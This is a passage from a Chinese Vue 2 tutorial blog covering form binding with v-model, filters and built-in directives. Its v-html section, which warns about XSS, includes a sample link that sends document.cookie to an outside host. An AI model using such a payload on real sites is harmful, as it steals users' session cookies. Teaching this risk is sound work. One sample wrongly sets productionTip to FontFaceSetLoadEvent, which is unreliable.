：</strong></p><p>Vue监视数据的原理：</p><ol><li><p>vue会监视data<strong>中所有层次的数据</strong></p></li><li><p>如何监测<strong>对象</strong>中的数据？</p><p>通过setter实现监视，且要在new Vue时就传入要监测的数据。</p><ul><li>对象中后追加的属性，Vue默认不做响应式处理</li><li>如需给后添加的属性做响应式，请使用如下API：</li></ul></li></ol><p><code>Vue.set(target，propertyName/index，value) </code></p><p><code>vm.$set(target，propertyName/index，value)</code></p><ol start="3"><li><p>如何监测数组中的数据？</p><p>通过包裹数组更新元素的方法实现，本质就是做了两件事：</p><ul><li>调用原生对应的方法对数组进行更新</li><li>重新解析模板，进而更新页面</li></ul></li><li><p>在Vue修改数组中的某个元素一定要用如下方法：</p><ul><li>使用这些API:push()、pop()、shift()、unshift()、splice()、sort()、reverse()</li><li>Vue.set() 或 vm.$set()</li></ul></li></ol><blockquote><p>特别注意：Vue.set() 和 vm.$set() 不能给vm 或 vm的根数据对象 添加属性！！！</p></blockquote><h2 id="1-15-收集表单数据"><a href="#1-15-收集表单数据" class="headerlink" title="1.15 收集表单数据"></a>1.15 收集表单数据</h2><p>收集表单数据</p><ul><li><p>若<code>&lt;input type=&quot;text&quot;/&gt;</code>，则v-model收集的是value值，用户输入的内容就是value值</p></li><li><p>若<code>&lt;input type=&quot;radio&quot;/&gt;</code>，则v-model收集的是value值，且要给标签配置value属性</p></li><li><p>若<code>&lt;input type=&quot;checkbox&quot;/&gt;</code> </p><ul><li>没有配置value属性，那么收集的是checked属性（勾选 or 未勾选，是布尔值）</li><li>配置了value属性<ul><li>v-model的初始值是非数组，那么收集的就是checked（勾选 or 未勾选，是布尔值）</li><li>v-model的初始值是数组，那么收集的就是value组成的数组</li></ul></li></ul></li><li><p>v-model的三个修饰符</p><ul><li><p>lazy失去焦点后再收集数据</p></li><li><p>number 输入字符串转为有效的数字</p></li><li><p>trim输入首尾空格过滤</p></li></ul></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>收集表单数据<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">form</span> @<span class="hljs-attr">submit.prevent</span>=<span class="hljs-string">&quot;demo&quot;</span>&gt;</span><br>    账号：<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">v-model.trim</span>=<span class="hljs-string">&quot;userInfo.account&quot;</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br>    密码：<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">&quot;userInfo.password&quot;</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br>    年龄：<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;number&quot;</span> <span class="hljs-attr">v-model.number</span>=<span class="hljs-string">&quot;userInfo.age&quot;</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br>    性别：<br>    男<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;sex&quot;</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">&quot;userInfo.sex&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;male&quot;</span>&gt;</span><br>    女<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;sex&quot;</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">&quot;userInfo.sex&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;female&quot;</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br>    爱好：<br>    学习<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">&quot;userInfo.hobby&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;study&quot;</span>&gt;</span><br>    打游戏<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">&quot;userInfo.hobby&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;game&quot;</span>&gt;</span><br>    吃饭<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">&quot;userInfo.hobby&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;eat&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br>    所属校区<br>    <span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">&quot;userInfo.city&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span>请选择校区<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;beijing&quot;</span>&gt;</span>北京<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;shanghai&quot;</span>&gt;</span>上海<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;shenzhen&quot;</span>&gt;</span>深圳<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;wuhan&quot;</span>&gt;</span>成都<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span><br>    其他信息：<br>    <span class="hljs-tag">&lt;<span class="hljs-name">textarea</span> <span class="hljs-attr">v-model.lazy</span>=<span class="hljs-string">&quot;userInfo.other&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">textarea</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">&quot;userInfo.agree&quot;</span>&gt;</span>阅读并接受<br>    <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://www.yuque.com/cessstudy&quot;</span>&gt;</span>《用户协议》<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span>&gt;</span>提交<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-title class_">Vue</span>.<span class="hljs-property">config</span>.<span class="hljs-property">productionTip</span> = <span class="hljs-literal">false</span></span><br><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">    <span class="hljs-attr">el</span>: <span class="hljs-string">&#x27;#root&#x27;</span>,</span><br><span class="language-javascript">    <span class="hljs-attr">data</span>: &#123;</span><br><span class="language-javascript">      <span class="hljs-attr">userInfo</span>: &#123;</span><br><span class="language-javascript">        <span class="hljs-attr">account</span>: <span class="hljs-string">&#x27;&#x27;</span>,</span><br><span class="language-javascript">        <span class="hljs-attr">password</span>: <span class="hljs-string">&#x27;&#x27;</span>,</span><br><span class="language-javascript">        <span class="hljs-attr">age</span>: <span class="hljs-number">18</span>,</span><br><span class="language-javascript">        <span class="hljs-attr">sex</span>: <span class="hljs-string">&#x27;female&#x27;</span>,</span><br><span class="language-javascript">        <span class="hljs-attr">hobby</span>: [],</span><br><span class="language-javascript">        <span class="hljs-attr">city</span>: <span class="hljs-string">&#x27;beijing&#x27;</span>,</span><br><span class="language-javascript">        <span class="hljs-attr">other</span>: <span class="hljs-string">&#x27;&#x27;</span>,</span><br><span class="language-javascript">        <span class="hljs-attr">agree</span>: <span class="hljs-string">&#x27;&#x27;</span></span><br><span class="language-javascript">      &#125;</span><br><span class="language-javascript">    &#125;,</span><br><span class="language-javascript">    <span class="hljs-attr">methods</span>: &#123;</span><br><span class="language-javascript">      <span class="hljs-title function_">demo</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">userInfo</span>))</span><br><span class="language-javascript">      &#125;</span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript">  &#125;)</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="1-16-过滤器（非重点-Vue3已移除"><a href="#1-16-过滤器（非重点-Vue3已移除" class="headerlink" title="1.16 过滤器（非重点,Vue3已移除)"></a>1.16 <del>过滤器</del>（非重点,Vue3已移除)</h2><p>定义：对要显示的数据进行特定格式化后再显示（适用于一些简单逻辑的处理）</p><ul><li><p>注册过滤器：</p><ul><li><p>Vue.filter(name, callback)全局过滤器</p></li><li><p>new Vue {filters: {}} 局部过滤器</p></li></ul></li><li><p>使用过滤器：<code>&#123;&#123; xxx | 过滤器名&#125;&#125;</code>或 v-bind:属性 &#x3D; “xxx | 过滤器名”<br>备注：</p><ul><li><p>过滤器可以接收额外参数，多个过滤器也可以串联</p></li><li><p>并没有改变原本的数据，而是产生新的对应的数据</p></li></ul></li></ul><p>处理时间的库moment体积较大 dayjs轻量级</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>过滤器<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://cdn.bootcdn.net/ajax/libs/dayjs/1.10.6/dayjs.min.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>时间<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>当前时间戳：&#123;&#123;time&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>转换后时间：&#123;&#123;time | timeFormater()&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>转换后时间：&#123;&#123;time | timeFormater(&#x27;YYYY-MM-DD HH:mm:ss&#x27;)&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>截取年月日：&#123;&#123;time | timeFormater() | mySlice&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-title class_">Vue</span>.<span class="hljs-property">config</span>.<span class="hljs-property">productionTip</span> = <span class="hljs-literal">false</span></span><br><span class="language-javascript"><span class="hljs-comment">// 全局过滤器</span></span><br><span class="language-javascript"><span class="hljs-title class_">Vue</span>.<span class="hljs-title function_">filter</span>(<span class="hljs-string">&#x27;mySlice&#x27;</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params">value</span>)&#123;</span><br><span class="language-javascript"><span class="hljs-keyword">return</span> value.<span class="hljs-title function_">slice</span>(<span class="hljs-number">0</span>,<span class="hljs-number">11</span>)</span><br><span class="language-javascript">&#125;)</span><br><span class="language-javascript"><span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">            <span class="hljs-attr">el</span>:<span class="hljs-string">&#x27;#root&#x27;</span>,</span><br><span class="language-javascript">            <span class="hljs-attr">data</span>:&#123;</span><br><span class="language-javascript">                <span class="hljs-attr">time</span>:<span class="hljs-number">1626750147900</span>,</span><br><span class="language-javascript">            &#125;,</span><br><span class="language-javascript"><span class="hljs-comment">// 局部过滤器</span></span><br><span class="language-javascript">            <span class="hljs-attr">filters</span>:&#123;</span><br><span class="language-javascript">                <span class="hljs-title function_">timeFormater</span>(<span class="hljs-params">value, str=<span class="hljs-string">&quot;YYYY年MM月DD日 HH:mm:ss&quot;</span></span>)&#123;</span><br><span class="language-javascript">                    <span class="hljs-keyword">return</span> <span class="hljs-title function_">dayjs</span>(value).<span class="hljs-title function_">format</span>(str)</span><br><span class="language-javascript">                &#125;</span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125;)</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>备注：</p><p>1.过滤器也可以接收额外参数、多个过滤器也可以串联</p><p>2.并没有改变原本的数据, 是产生新的对应的数据</p></blockquote><h2 id="1-17-内置指令"><a href="#1-17-内置指令" class="headerlink" title="1.17 内置指令"></a>1.17 内置指令</h2><p>之前学过的指令： </p><ul><li>v-bind单向绑定解析表达式，可简写为:</li><li>v-model双向数据绑定</li><li>v-for遍历数组 &#x2F; 对象 &#x2F; 字符串</li><li>v-on绑定事件监听，可简写为<code>@</code></li><li>v-show条件渲染 (动态控制节点是否展示)</li><li>v-if条件渲染（动态控制节点是否存存在）</li><li>v-else-if条件渲染（动态控制节点是否存存在）</li><li>v-else条件渲染（动态控制节点是否存存在）</li></ul><p><strong>v-text指令 ：</strong>(使用的比较少)</p><p>1.作用：向其所在的节点中渲染文本内容。</p><p>2.与插值语法的区别：v-text会替换掉节点中的内容，<code>&#123;&#123;xx&#125;&#125;</code>则不会。</p>   <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>v-text指令<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>你好，&#123;&#123;name&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">v-text</span>=<span class="hljs-string">&quot;name&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">v-text</span>=<span class="hljs-string">&quot;str&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-title class_">Vue</span>.<span class="hljs-property">config</span>.<span class="hljs-property">productionTip</span> = <span class="hljs-literal">false</span></span><br><span class="language-javascript">  <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">    <span class="hljs-attr">el</span>:<span class="hljs-string">&#x27;#root&#x27;</span>,</span><br><span class="language-javascript">    <span class="hljs-attr">data</span>:&#123;</span><br><span class="language-javascript">      <span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;cess&#x27;</span>,</span><br><span class="language-javascript">      <span class="hljs-attr">str</span>:<span class="hljs-string">&#x27;&lt;h3&gt;你好啊！&lt;/h3&gt;&#x27;</span></span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript">  &#125;)</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>v-html指令 ：</strong>(使用的很少)</p><p>1.作用：向指定节点中渲染包含html结构的内容。</p><p>2.与插值语法的区别：</p><ul><li>v-html会替换掉节点中所有的内容，<code>&#123;&#123;xx&#125;&#125;</code>则不会。</li><li>v-html可以识别html结构。</li></ul><p>3.严重注意：v-html有安全性问题！！！！</p><ul><li><p>在网站上动态渲染任意HTML是非常危险的，容易导致<a href="https://so.csdn.net/so/search?spm=1000.2115.3001.4498&q=XSS&t=&u=">XSS</a>攻击。</p></li><li><p>一定要在可信的内容上使用v-html，永不要用在用户提交的内容上！</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>v-html指令<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>你好，&#123;&#123; name &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">v-html</span>=<span class="hljs-string">&quot;str&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">v-html</span>=<span class="hljs-string">&quot;str2&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span><br><span class="language-xml"><span class="language-handlebars">  Vue.config.productionTip = FontFaceSetLoadEvent</span></span><br><span class="language-xml"><span class="language-handlebars">  new Vue(&#123;</span></span><br><span class="language-xml"><span class="language-handlebars">    el:&#x27;#root&#x27;,</span></span><br><span class="language-xml"><span class="language-handlebars">    data:&#123;</span></span><br><span class="language-xml"><span class="language-handlebars">      name:&#x27;cess&#x27;,</span></span><br><span class="language-xml"><span class="language-handlebars">      str:&#x27;<span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>你好啊！<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>&#x27;,</span></span><br><span class="language-xml"><span class="language-handlebars">      str2:&#x27;<span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">javascript:location.href</span>=<span class="hljs-string">&quot;http://www.baidu.com?&quot;</span>+<span class="hljs-attr">document.cookie</span>&gt;</span>兄弟我找到你想要的资源了，快来！<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>&#x27;,</span></span><br><span class="language-xml"><span class="language-handlebars">    &#125;</span></span><br><span class="language-xml"><span class="language-handlebars">  &#125;)</span></span><br><span class="language-xml"><span class="language-handlebars"></span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure></li></ul><p><strong>v-cloak指令 （没有值）：</strong></p><ul><li><p>本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉v-cloak属性。</p></li><li><p>使用css配合v-cloak可以解决网速慢时页面展示出<code>&#123;&#123;xxx&#125;&#125;</code>的问题。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>v-cloak指令<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-css"></span><br><span class="language-css">  <span class="hljs-selector-attr">[v-cloak]</span> &#123;</span><br><span class="language-css">    <span class="hljs-attribute">display</span>:none;</span><br><span class="language-css">  &#125;</span><br><span class="language-css"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">v-cloak</span>&gt;</span>&#123;&#123; name &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br>// 够延迟5秒收到vue.js<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://localhost:8080/resource/5s/vue.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-number">1</span>)</span><br><span class="language-javascript">  <span class="hljs-title class_">Vue</span>.<span class="hljs-property">config</span>.<span class="hljs-property">productionTip</span> = <span class="hljs-literal">false</span></span><br><span class="language-javascript">  <span 